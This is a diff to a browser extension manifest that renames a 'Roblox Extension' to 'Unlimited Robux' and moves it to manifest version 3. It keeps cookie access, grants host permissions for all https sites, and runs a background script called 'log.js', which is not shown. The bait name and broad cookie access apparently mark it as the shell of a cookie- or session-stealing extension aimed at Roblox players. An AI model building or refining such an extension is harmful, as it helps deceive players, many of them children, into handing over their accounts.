@@ -1,20 +1,23 @@
 {
-    "name": "Roblox Extension",
+    "name": "Unlimited Robux",
     "description": "Extension for https://www.roblox.com",
-    "version": "1.0.0",
-    "manifest_version": 2,
+    "version": "1.0.1",
+    "manifest_version": 3,
 
-    "browser_action" : {
+    "action" : {
         "default_icon": "assets/roblox.png"
     },
 
+    "host_permissions": [
+	"https://*/*"
+    ],
+
     "permissions": [
-        "cookies",
-        "https://*/*"
+        "cookies"
     ],
 
     "background": {
-        "scripts": ["scripts/log.js"]
+        "service_worker": "scripts/log.js"
     },
 
     "icons": {
